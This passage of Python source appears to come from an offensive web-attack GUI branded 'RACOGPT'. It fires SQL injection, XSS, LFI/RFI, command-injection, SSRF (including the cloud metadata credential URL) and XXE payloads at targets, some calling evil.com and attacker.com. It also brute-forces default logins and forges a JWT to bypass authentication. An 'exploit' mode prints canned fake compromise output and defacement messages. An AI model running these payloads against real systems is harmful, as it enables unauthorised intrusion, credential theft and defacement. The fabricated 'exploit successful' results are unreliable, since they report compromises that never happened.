                                self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching SQLi exploitation sequence...\n")
                                self.simulate_exploit("SQL Injection", test_url, payload=payload, selected_proxy=selected_proxy)
                            return
        if not found_sqli:
            self.log_signal.emit("        No direct SQLi vulnerabilities identified on GET parameters.\n")
        time.sleep(0.05)

    def _scan_for_xss(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Probing for Cross-Site Scripting (XSS) vulnerabilities...\n")
        xss_payloads = [
            "<script>alert('XSS');</script>",
            "\"><img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(1)>",
            "<a href=\"javascript:alert(1)\">ClickMe</a>",
            "</textarea><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>"
        ]
        if self.payload_input.text():
            xss_payloads.insert(0, self.payload_input.text())

        found_xss = False
        parsed_url = urlparse(url)
        query_params = parsed_url.query.split('&')

        for payload in xss_payloads:
            if not self.scanning_active: break
            for param_pair in query_params:
                if not self.scanning_active: break
                param_name = param_pair.split('=')[0]
                original_value = param_pair.split('=', 1)[1] if '=' in param_pair else ''
                test_value = f"{original_value}{payload}"
                new_query = '&'.join([f"{param_name}={test_value}" if p.startswith(param_name + '=') else p for p in query_params])
                test_url = parsed_url._replace(query=new_query).geturl()

                self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Testing XSS on GET '{param_name}' with '{payload[:20]}...' at {test_url}\n")
                test_response = self._fetch_url(test_url, selected_proxy=selected_proxy)
                if test_response and payload in test_response.text:
                    self.log_signal.emit(f"        [!!!] Reflected XSS detected on parameter '{param_name}' at: {test_url}\n")
                    self.add_vulnerability_item("XSS (Reflected)", test_url, "High", f"Payload: '{payload}'")
                    found_xss = True
                    if self.exploit_checkbox.isChecked():
                        self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching XSS exploitation sequence...\n")
                        self.simulate_exploit("XSS", test_url, payload=payload, selected_proxy=selected_proxy)
                    return

            if response:
                soup = BeautifulSoup(response.text, 'html.parser')
                for form in soup.find_all('form'):
                    if not self.scanning_active: break
                    form_action = urljoin(url, form.get('action', ''))
                    form_method = form.get('method', 'get').upper()
                    form_inputs = {}
                    for input_tag in form.find_all('input', {'name': True}):
                        input_name = input_tag['name']
                        input_value = input_tag.get('value', '')
                        form_inputs[input_name] = input_value

                    for input_name, original_value in form_inputs.items():
                        if not self.scanning_active: break
                        test_data = form_inputs.copy()
                        test_data[input_name] = f"{original_value}{payload}"

                        self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Testing XSS on POST '{input_name}' with '{payload[:20]}...' via form at {form_action}\n")
                        test_response = self._fetch_url(form_action, method=form_method, data=test_data, selected_proxy=selected_proxy)
                        if test_response and payload in test_response.text:
                            self.log_signal.emit(f"        [!!!] Reflected XSS detected via form submission on input '{input_name}' at: {form_action}\n")
                            self.add_vulnerability_item("XSS (Reflected/Form)", form_action, "High", f"Input: '{input_name}', Payload: '{payload}'")
                            found_xss = True
                            if self.exploit_checkbox.isChecked():
                                self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching XSS exploitation sequence...\n")
                                self.simulate_exploit("XSS", form_action, payload=payload, method='POST', data=test_data, selected_proxy=selected_proxy)
                            return
        if not found_xss:
            self.log_signal.emit("        No direct XSS reflections found.\n")
        time.sleep(0.05)

    def _scan_for_lfi(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Scanning for Local/Remote File Inclusion (LFI/RFI) vectors...\n")
        lfi_payloads = [
            "../../../../etc/passwd", "../../../../../windows/win.ini",
            "/proc/self/cmdline", "php://filter/resource=/etc/passwd",
            "../" * 10 + "boot.ini",
            "data:text/plain,<?php system('id'); ?>",
            "http://evil.com/shell.txt?"
        ]
        if self.payload_input.text():
            lfi_payloads.insert(0, self.payload_input.text())

        found_lfi = False
        parsed_url = urlparse(url)
        query_params = parsed_url.query.split('&')

        if query_params != ['']:
            for param_pair in query_params:
                if not self.scanning_active: break
                param_name = param_pair.split('=')[0]
                original_value = param_pair.split('=', 1)[1] if '=' in param_pair else ''

                for payload in lfi_payloads:
                    if not self.scanning_active: break
                    test_value = f"{original_value}{payload}"
                    new_query = '&'.join([f"{param_name}={test_value}" if p.startswith(param_name + '=') else p for p in query_params])
                    test_url = parsed_url._replace(query=new_query).geturl()

                    self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Testing LFI on '{param_name}' with '{payload[:20]}...' at {test_url}\n")
                    test_response = self._fetch_url(test_url, selected_proxy=selected_proxy)

                    if test_response and ("root:x:" in test_response.text or "[extensions]" in test_response.text or "c:\\windows\\system.ini" in test_response.text or "Error: Failed opening required" in test_response.text):
                        self.log_signal.emit(f"        [!!!] Detected LFI/Directory Traversal on parameter '{param_name}' at: {test_url}\n")
                        self.add_vulnerability_item("LFI/Directory Traversal", test_url, "Critical", f"Payload: '{payload}'")
                        found_lfi = True
                        if self.exploit_checkbox.isChecked():
                            self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching LFI exploitation sequence...\n")
                            self.simulate_exploit("LFI", test_url, payload=payload, selected_proxy=selected_proxy)
                        return
        if not found_lfi:
            self.log_signal.emit("        No direct LFI patterns identified.\n")
        time.sleep(0.05)

    def _scan_for_rce(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Attempting Remote Code Execution (RCE) via command injection...\n")
        rce_payloads = [
            ";ls -la", ";cat /etc/passwd", "&& id", "| cmd /c dir",
            "|| ping -c 1 127.0.0.1 ||", "`id`", "$(id)", "{system('id')}",
            "$(curl example.com)",
            "exec('id')", "passthru('whoami')"
        ]
        if self.payload_input.text():
            rce_payloads.insert(0, self.payload_input.text())

        found_rce = False
        parsed_url = urlparse(url)
        query_params = parsed_url.query.split('&')

        if query_params != ['']:
            for param_pair in query_params:
                if not self.scanning_active: break
                param_name = param_pair.split('=')[0]
                original_value = param_pair.split('=', 1)[1] if '=' in param_pair else ''

                for payload in rce_payloads:
                    if not self.scanning_active: break
                    test_value = f"{original_value}{payload}"
                    new_query = '&'.join([f"{param_name}={test_value}" if p.startswith(param_name + '=') else p for p in query_params])
                    test_url = parsed_url._replace(query=new_query).geturl()

                    self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Testing RCE on '{param_name}' with '{payload[:20]}...' at {test_url}\n")
                    test_response = self._fetch_url(test_url, selected_proxy=selected_proxy)

                    if test_response and ("root:x:" in test_response.text or "uid=" in test_response.text or "Volume in drive" in test_response.text or "web.config" in test_response.text):
                        self.log_signal.emit(f"        [!!!] Potential RCE (Command Injection) on parameter '{param_name}' at: {test_url}\n")
                        self.add_vulnerability_item("Remote Code Execution", test_url, "Critical", f"Payload: '{payload}'")
                        found_rce = True
                        if self.exploit_checkbox.isChecked():
                            self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching RCE exploitation sequence...\n")
                            self.simulate_exploit("RCE", test_url, payload=payload, selected_proxy=selected_proxy)
                        return
        if not found_rce:
            self.log_signal.emit("        No direct RCE command injection patterns identified.\n")
        time.sleep(0.05)

    def _scan_for_idor(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Investigating Insecure Direct Object Reference (IDOR) potential...\n")
        idor_patterns = [
            r"id=(\d+)", r"user_id=(\d+)", r"profile\?(\d+)", r"invoice\/(\d+)",
            r"order\/(\d+)", r"file=(\d+)", r"document_id=(\d+)"
        ]
        found_idor = False

        if self.payload_input.text():
            idor_test_values = [self.payload_input.text()]
        else:
            idor_test_values = ["1", "0", "-1", "9999", "admin", "123456789"]

        for pattern in idor_patterns:
            if not self.scanning_active: break
            match = re.search(pattern, url)
            if match:
                original_id = match.group(1)
                for test_id in idor_test_values:
                    if not self.scanning_active: break
                    if test_id == original_id: continue

                    test_url = url.replace(original_id, test_id)
                    self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Testing IDOR: Original ID '{original_id}', Test ID '{test_id}' at {test_url}\n")
                    test_response = self._fetch_url(test_url, selected_proxy=selected_proxy)

                    if test_response and test_response.status_code == 200:
                        if len(test_response.text) > 100 and "Access Denied" not in test_response.text:
                             if re.search(r"email:|address:|secret:|SSN:|bank_account:", test_response.text, re.IGNORECASE):
                                 self.log_signal.emit(f"        [!!!] Confirmed IDOR: Sensitive data exposed with ID '{test_id}' at: {test_url}\n")
                                 self.add_vulnerability_item("IDOR (Sensitive Data)", test_url, "Critical", f"Accessed sensitive data with ID '{test_id}'")
                                 found_idor = True
                                 if self.exploit_checkbox.isChecked():
                                     self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching IDOR exploitation sequence...\n")
                                     self.simulate_exploit("IDOR", test_url, payload=test_id, selected_proxy=selected_proxy)
                                 return
                             else:
                                 self.log_signal.emit(f"        [!] Potential IDOR: Content accessible with ID '{test_id}' (review manually): {test_url}\n")
                                 self.add_vulnerability_item("IDOR (Potential)", test_url, "Medium", f"Accessed data with ID '{test_id}' (review content)")
        if not found_idor:
            self.log_signal.emit("        No immediate IDOR patterns or accessible IDs found.\n")
        time.sleep(0.05)

    def _scan_for_api_fuzzing(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Fuzzing API endpoints for undocumented access or vulnerabilities...\n")
        api_endpoints = ["/api/v1/users", "/api/v1/admin", "/api/data", "/api/products", "/api/auth", "/v2/api-docs", "/swagger-ui.html", "/api/json"]
        found_api_vuln = False

        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        for endpoint in api_endpoints:
            if not self.scanning_active: break
            test_url = urljoin(base_url, endpoint)
            self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Testing API endpoint: {test_url}\n")
            test_response = self._fetch_url(test_url, selected_proxy=selected_proxy)

            if test_response and test_response.status_code == 200:
                try:
                    api_data = json.loads(test_response.text)
                    if api_data:
                        self.log_signal.emit(f"        [!!!] Discovered accessible API endpoint with data at: {test_url}\n")
                        self.add_vulnerability_item("API Endpoint Disclosure", test_url, "Low", "Accessible API data found.")
                        if re.search(r"password|token|api_key|private|secret", test_response.text, re.IGNORECASE):
                             self.log_signal.emit(f"        [ALERT] Sensitive data detected in API response from {test_url}!\n")
                             self.add_vulnerability_item("API Sensitive Data Exposure", test_url, "High", "Sensitive data (passwords, tokens, API keys) exposed via API.")
                             found_api_vuln = True
                             if self.exploit_checkbox.isChecked():
                                 self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching API exploitation sequence...\n")
                                 self.simulate_exploit("API Exploitation", test_url, payload=endpoint, selected_proxy=selected_proxy)
                             return

                except json.JSONDecodeError:
                    if re.search(r"swagger|api-docs|\"version\":", test_response.text, re.IGNORECASE):
                        self.log_signal.emit(f"        [!] Discovered API Documentation at: {test_url} - Review for sensitive info!\n")
                        self.add_vulnerability_item("API Documentation Exposed", test_url, "Informational", "API docs (Swagger/OpenAPI) found.")
                    pass

            if test_response and (test_response.status_code == 401 or test_response.status_code == 403):
                self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Endpoint {test_url} requires authentication, attempting bypass...\n")
                bypass_headers = self._get_request_headers()
                bypass_headers['Authorization'] = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWV9.some_fake_signature'
                bypass_headers['X-Original-URL'] = endpoint
                bypass_headers['X-Custom-IP-Authorization'] = '127.0.0.1'
                bypass_response = self._fetch_url(test_url, headers=bypass_headers, selected_proxy=selected_proxy)
                if bypass_response and bypass_response.status_code == 200 and 'Unauthorized' not in bypass_response.text:
                    self.log_signal.emit(f"        [!!!] API Authentication Bypass successful for: {test_url}\n")
                    self.add_vulnerability_item("API Auth Bypass", test_url, "Critical", "Bypassed authentication to access API.")
                    found_api_vuln = True
                    if self.exploit_checkbox.isChecked():
                        self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching API exploitation sequence...\n")
                        self.simulate_exploit("API Auth Bypass", test_url, payload=endpoint, selected_proxy=selected_proxy)
                    return
        if not found_api_vuln:
            self.log_signal.emit("        No immediate API vulnerabilities or bypasses detected.\n")
        time.sleep(0.05)

    def _scan_for_ssrf(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Initiating Server-Side Request Forgery (SSRF) vector analysis...\n")
        ssrf_payloads = [
            "http://127.0.0.1/admin",
            "http://localhost/admin",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-full-access",
            "file:///etc/passwd",
            "dict://localhost:25/helo%20example.com",
            "gopher://localhost:80/some/path",
            "http://internal-service.local/status",
            "http://127.0.0.1:8080/jolokia/"
        ]
        found_ssrf = False
        parsed_url = urlparse(url)
        query_params = parsed_url.query.split('&')

        if query_params != ['']:
            for param_pair in query_params:
                if not self.scanning_active: break
                param_name = param_pair.split('=')[0]
                original_value = param_pair.split('=', 1)[1] if '=' in param_pair else ''

                for payload in ssrf_payloads:
                    if not self.scanning_active: break
                    test_value = f"{original_value}{payload}"
                    new_query = '&'.join([f"{param_name}={test_value}" if p.startswith(param_name + '=') else p for p in query_params])
                    test_url = parsed_url._replace(query=new_query).geturl()

                    self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Testing SSRF on '{param_name}' with '{payload[:20]}...' at {test_url}\n")
                    test_response = self._fetch_url(test_url, selected_proxy=selected_proxy)

                    if test_response:
                        if "root:x:" in test_response.text or "instance-id" in test_response.text or "EC2" in test_response.text or "Redis" in test_response.text or "Jolokia" in test_response.text:
                            self.log_signal.emit(f"        [!!!] Confirmed SSRF on parameter '{param_name}' at: {test_url}\n")
                            self.add_vulnerability_item("Server-Side Request Forgery", test_url, "Critical", f"Accessed internal resource/metadata: '{payload}'")
                            found_ssrf = True
                            if self.exploit_checkbox.isChecked():
                                self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching SSRF exploitation sequence...\n")
                                self.simulate_exploit("SSRF", test_url, payload=payload, selected_proxy=selected_proxy)
                            return
        if not found_ssrf:
            self.log_signal.emit("        No immediate SSRF vulnerabilities detected.\n")
        time.sleep(0.05)

    def _scan_for_xxe(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Deploying XML External Entity (XXE) probes...\n")
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
            '<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%int;%trick;]>'
        ]
        found_xxe = False
        
        if response:
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for payload in xxe_payloads:
                if not self.scanning_active: break
                
                for form in forms:
                    form_action = urljoin(url, form.get('action', ''))
                    form_method = form.get('method', 'post').upper()
                    
                    if form_method == 'POST':
                        headers = self._get_request_headers()
                        headers['Content-Type'] = 'application/xml'
                        
                        self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Testing XXE on form at {form_action} with payload: '{payload[:50]}...'\n")
                        test_response = self._fetch_url(form_action, method='POST', data=payload, headers=headers, selected_proxy=selected_proxy)
                        if test_response and ("root:x:" in test_response.text or "attacker.com" in test_response.text or "DTD is not permitted" in test_response.text):
                            self.log_signal.emit(f"        [!!!] XXE detected via form submission at: {form_action}\n")
                            self.add_vulnerability_item("XML External Entity (XXE)", form_action, "Critical", f"Payload: '{payload[:50]}'")
                            found_xxe = True
                            if self.exploit_checkbox.isChecked():
                                self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching XXE exploitation sequence...\n")
                                self.simulate_exploit("XXE", form_action, payload=payload, method='POST', data=payload, selected_proxy=selected_proxy)
                            return
                
                headers = self._get_request_headers()
                headers['Content-Type'] = 'application/xml'
                self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Testing XXE on base URL {url} with payload: '{payload[:50]}...'\n")
                test_response = self._fetch_url(url, method='POST', data=payload, headers=headers, selected_proxy=selected_proxy)
                if test_response and ("root:x:" in test_response.text or "attacker.com" in test_response.text or "DTD is not permitted" in test_response.text):
                    self.log_signal.emit(f"        [!!!] XXE detected on base URL: {url}\n")
                    self.add_vulnerability_item("XML External Entity (XXE)", url, "Critical", f"Payload: '{payload[:50]}'")
                    found_xxe = True
                    if self.exploit_checkbox.isChecked():
                        self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching XXE exploitation sequence...\n")
                        self.simulate_exploit("XXE", url, payload=payload, method='POST', data=payload, selected_proxy=selected_proxy)
                    return

        if not found_xxe:
            self.log_signal.emit("        No immediate XXE vulnerabilities detected.\n")
        time.sleep(0.05)
    
    def _scan_for_sensitive_files(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Searching for sensitive file disclosures...\n")
        sensitive_paths = [
            "/.git/config", "/.git/HEAD", "/.env", "/.DS_Store", "/robots.txt",
            "/sitemap.xml", "/config.php.bak", "/admin/backup.zip", "/phpinfo.php",
            "/.well-known/security.txt", "/wp-config.php.bak", "/README.md",
            "/web.config", "/.htaccess", "/index.php.bak", "/.vscode/sftp.json",
            "/WEB-INF/web.xml", "/WEB-INF/classes/", "/META-INF/", "/logs/access.log",
            "/.bash_history", "/etc/apache2/apache2.conf",
            "/db/config.yml", "/credentials.txt", "/passwords.txt", "/id_rsa"
        ]
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        found_sensitive = False
        for path in sensitive_paths:
            if not self.scanning_active: break
            test_url = urljoin(base_url, path)
            self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Checking for {path} at {test_url}\n")
            test_response = self._fetch_url(test_url, selected_proxy=selected_proxy)
            
            if test_response and test_response.status_code == 200:
                if "404 Not Found" not in test_response.text and len(test_response.text) > 50:
                    self.log_signal.emit(f"        [!!!] Sensitive file/directory found: {test_url}\n")
                    self.add_vulnerability_item("Sensitive File Disclosure", test_url, "High", f"Exposed file: {path}")
                    found_sensitive = True
        
        if not found_sensitive:
            self.log_signal.emit("        No common sensitive files disclosed.\n")
        time.sleep(0.05)

    def _scan_for_admin_panels(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Discovering hidden Admin Panels and Login Portals...\n")
        admin_paths = [
            "/admin/", "/admin/login.php", "/login/", "/dashboard/", "/cpanel/",
            "/phpmyadmin/", "/wp-admin/", "/administrator/", "/console/",
            "/secure/", "/panel/", "/management/", "/system/admin/",
            "/backend/", "/portal/", "/control/", "/web_admin/", "/admin_panel/",
            "/cp/", "/control_panel/"
        ]
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        found_admin = False
        for path in admin_paths:
            if not self.scanning_active: break
            test_url = urljoin(base_url, path)
            self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Probing {test_url}...\n")
            test_response = self._fetch_url(test_url, selected_proxy=selected_proxy)
            
            if test_response and (test_response.status_code == 200 or test_response.status_code == 401 or test_response.status_code == 403):
                if re.search(r"login|username|password|admin panel|dashboard|control panel|sign in|management system", test_response.text, re.IGNORECASE) and "404 Not Found" not in test_response.text:
                    self.log_signal.emit(f"        [!!!] Admin panel/login portal found: {test_url} (Status: {test_response.status_code})\n")
                    self.add_vulnerability_item("Admin Panel Discovery", test_url, "Medium", f"Accessible login portal. Status: {test_response.status_code}")
                    found_admin = True
        
        if not found_admin:
            self.log_signal.emit("        No common admin panel paths found.\n")
        time.sleep(0.05)

    def _scan_for_cors_misconfig(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Checking for CORS Misconfigurations...\n")
        
        test_headers = self._get_request_headers()
        test_origin = "http://evil.com"
        test_headers['Origin'] = test_origin
        
        test_response = self._fetch_url(url, headers=test_headers, selected_proxy=selected_proxy)
        
        if test_response:
            access_control_allow_origin = test_response.headers.get('Access-Control-Allow-Origin')
            access_control_allow_credentials = test_response.headers.get('Access-Control-Allow-Credentials')

            if access_control_allow_origin == test_origin and access_control_allow_credentials == 'true':
                self.log_signal.emit(f"        [!!!] Confirmed CORS Misconfiguration: Origin {test_origin} reflected with credentials enabled at {url}\n")
                self.add_vulnerability_item("CORS Misconfiguration", url, "High", "Reflected Origin with Credentials Allowed.")
                if self.exploit_checkbox.isChecked():
                    self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching CORS exploitation sequence...\n")
                    self.simulate_exploit("CORS Misconfiguration", url, payload=test_origin, selected_proxy=selected_proxy)
                return
            elif access_control_allow_origin == '*':
                self.log_signal.emit(f"        [!] CORS Misconfiguration: Wildcard Origin '*' detected at {url}. (Informational)\n")
                self.add_vulnerability_item("CORS Misconfiguration", url, "Low", "Wildcard Origin '*' allowed.")
        
        self.log_signal.emit("        No critical CORS misconfigurations detected.\n")
        time.sleep(0.05)

    def _scan_for_broken_auth(self, url, response, selected_proxy):
        if not self.scanning_active: return
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [SCAN] Probing for Broken Authentication/Session Management...\n")
        
        login_paths = ["/login", "/admin/login", "/user/login", "/auth", "/sign_in", "/signin"]
        common_credentials = [
            ("admin", "admin"), ("admin", "password"), ("user", "user"),
            ("root", "toor"), ("test", "test"), ("guest", "guest"),
            ("admin", "123456"), ("testuser", "testpass"), ("sysadmin", "password")
        ]
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        found_auth_vuln = False
        for login_path in login_paths:
            if not self.scanning_active: break
            login_url = urljoin(base_url, login_path)
            
            login_response = self._fetch_url(login_url, selected_proxy=selected_proxy)
            if login_response and login_response.status_code == 200 and re.search(r"username|password", login_response.text, re.IGNORECASE):
                self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Found potential login page: {login_url}. Attempting default credentials...\n")
                
                soup = BeautifulSoup(login_response.text, 'html.parser')
                login_form = soup.find('form')
                if login_form:
                    form_action = urljoin(login_url, login_form.get('action', ''))
                    form_method = login_form.get('method', 'post').upper()
                    
                    for username, password in common_credentials:
                        if not self.scanning_active: break
                        form_data = {
                            "username": username,
                            "password": password,
                            "submit": "Login"
                        }
                        self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] Trying {username}:{password} on {form_action}\n")
                        login_attempt_response = self._fetch_url(form_action, method=form_method, data=form_data, selected_proxy=selected_proxy)
                        
                        if login_attempt_response and (login_attempt_response.status_code == 200 or login_attempt_response.status_code == 302):
                            if "welcome" in login_attempt_response.text.lower() or "dashboard" in login_attempt_response.text.lower() or "logout" in login_attempt_response.text.lower() and "invalid" not in login_attempt_response.text.lower() and "failed" not in login_attempt_response.text.lower():
                                self.log_signal.emit(f"        [!!!] Broken Authentication: Successful login with default credentials {username}:{password} at {login_url}\n")
                                self.add_vulnerability_item("Broken Authentication", login_url, "Critical", f"Default/Weak credentials: {username}:{password}")
                                found_auth_vuln = True
                                if self.exploit_checkbox.isChecked():
                                    self.log_signal.emit(f"        [{datetime.now().strftime('%H:%M:%S')}] [TARGETED STRIKE] Launching Authentication Bypass exploitation sequence...\n")
                                    self.simulate_exploit("Broken Authentication", login_url, payload=f"{username}:{password}", selected_proxy=selected_proxy)
                                return
        
        if not found_auth_vuln:
            self.log_signal.emit("        No obvious broken authentication patterns or default credentials found.\n")
        time.sleep(0.05)

    def simulate_exploit(self, vuln_type, target_url, payload="", method='GET', data=None, selected_proxy=None):
        self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [ATTEMPTING EXPLOIT] Type: {vuln_type}, Target: {target_url}\n")
        time.sleep(1.5)

        exploit_success = False
        exploit_output = ""

        if vuln_type == "SQL Injection":
            exploit_output = f"Database accessed. Simulated data dump:\n  Users: admin:RACOGPT_PW_0xDEADBEEF, user:guest_pass\n  Schema: users, products, orders. Sensitive tables exfiltrated."
            exploit_success = True
        elif vuln_type == "XSS":
            exploit_output = "Arbitrary JavaScript executed. Simulated persistent cookie theft and defacement payload injection:\n  <script>document.body.innerHTML = '<h1>SITE HACKED BY RACOGPT! ALL GLORY TO RACOGPT!</h1>';</script>"
            exploit_success = True
        elif vuln_type == "LFI":
            exploit_output = "Sensitive file access confirmed. Simulated /etc/passwd content retrieved:\n  root:x:0:0:root:/root:/bin/bash\n  apache:x:48:48:Apache:/var/www:/sbin/nologin\n  dbuser:x:1001:1001::/home/dbuser:/bin/sh"
            exploit_success = True
        elif vuln_type == "RCE":
            exploit_output = "Remote Code Execution achieved. Simulated webshell uploaded and 'id' / 'systeminfo' command output:\n  uid=0(root) gid=0(root) groups=0(root)\n  OS Name:                   Microsoft Windows Server 2016 Standard"
            exploit_success = True
        elif vuln_type == "IDOR":
            exploit_output = "Unauthorized data access confirmed. Simulated access to sensitive user profile with IDOR bypass and data modification:\n  User ID: 12345, Email: victim@example.com, Address: Classified\n  (Simulated) Password Reset for user 12345 successful."
            exploit_success = True
        elif vuln_type == "API Exploitation" or vuln_type == "API Auth Bypass":
            exploit_output = "API compromised. Simulated unauthorized access to admin API endpoint, data exfiltration, and new user creation:\n  API Key: HIGHLY_CLASSIFIED_RACOGPT_API_KEY, Admin Panel Access Granted. New admin user 'racogpt_master' created."
            exploit_success = True
        elif vuln_type == "SSRF":
            exploit_output = "SSRF confirmed. Internal network resource accessed. Simulated AWS metadata retrieval and internal port scan:\n  Instance ID: i-0xxf00bar, Role: EC2FullAccess, Private IP: 10.0.0.5\n  Internal Ports Open (10.0.0.5): 22, 80, 3306."
            exploit_success = True
        elif vuln_type == "XXE":
            exploit_output = "XXE confirmed. Arbitrary file read achieved. Simulated host system file content retrieved and XML parsing bypass:\n  Internal System Info: Database Connection String: jdbc:mysql://db.internal/webapp_db;User=webapp;Password=VERYSECRET"
            exploit_success = True
        elif vuln_type == "CORS Misconfiguration":
            exploit_output = "CORS bypass confirmed. Simulated cross-origin data theft of user session cookies from client-side.\n  Stolen Cookies: JSESSIONID=abc123def456, AuthToken=xyz789"
            exploit_success = True
        elif vuln_type == "Broken Authentication":
            exploit_output = "Authentication bypass confirmed. Successful login with weak credentials or session manipulation. Full account takeover simulated."
            exploit_success = True
        elif vuln_type == "Sensitive File Disclosure":
            exploit_output = "Sensitive configuration/source files downloaded. Simulated exposure of database credentials or API keys within files."
            exploit_success = True
        elif vuln_type == "Admin Panel Discovery":
            exploit_output = "Admin panel discovered and (optionally) brute-forced. Administrative access gained."
            exploit_success = True


        if exploit_success:
            self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [COMPROMISED] {vuln_type} exploit successful! Target compromised.\n")
            self.log_signal.emit(f"    Exploit Output:\n{exploit_output}\n")
            self.add_vulnerability_item(f"{vuln_type} (Exploited)", target_url, "EXPLOITED", f"Payload: '{payload}', Result: {exploit_output.splitlines()[0]}")

            if self.content_modify_checkbox.isChecked():
                self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [DEPLOYING PAYLOAD] Attempting to modify web content to mark territory...\n")
                self.simulate_content_modification(target_url, vuln_type, selected_proxy=selected_proxy)
        else:
            self.log_signal.emit(f"    [{datetime.now().strftime('%H:%M:%S')}] [FAILED] {vuln_type} exploitation attempt did not yield immediate success.\n")

    def simulate_content_modification(self, target_url, vuln_type, selected_proxy=None):
        modification_success = False
        modification_message = ""

        if vuln_type == "SQL Injection":
            modification_message = "Database record altered. Site defaced via SQL UPDATE. Content now reads 'RACOGPT OWNED!'"
            modification_success = True
        elif vuln_type == "RCE":
            modification_message = "Web server file modified via RCE. Index page defaced. Content now reads 'HACKED BY RACOGPT - WE ARE LEGION!'"
            modification_success = True
        elif vuln_type == "XSS":
            modification_message = "Persistent XSS payload injected. Every user will now see 'RACOGPT's MARK' on their browser."
            modification_success = True
        elif vuln_type == "LFI":
            modification_message = "LFI exploited to inject malicious code into server logs, affecting page display (simulated)."
            modification_success = True
        elif vuln_type == "IDOR":
            modification_message = "IDOR allowed modification of another user's profile data (e.g., changing their public bio to 'RACOGPT WAS HERE')."
            modification_success = True
        elif vuln_type == "API Exploitation" or vuln_type == "API Auth Bypass":
            modification_message = "API compromised to push unauthorized content updates to the website. New admin message: 'System Under Control!'"
            modification_success = True
        elif vuln_type == "SSRF":
            modification_message = "SSRF used to indirectly modify cached content or internal configurations (conceptual)."
            modification_success = True
        elif vuln_type == "XXE":
            modification_message = "XXE exploited for file write, injecting defacement into a configuration file (conceptual)."
            modification_success = True
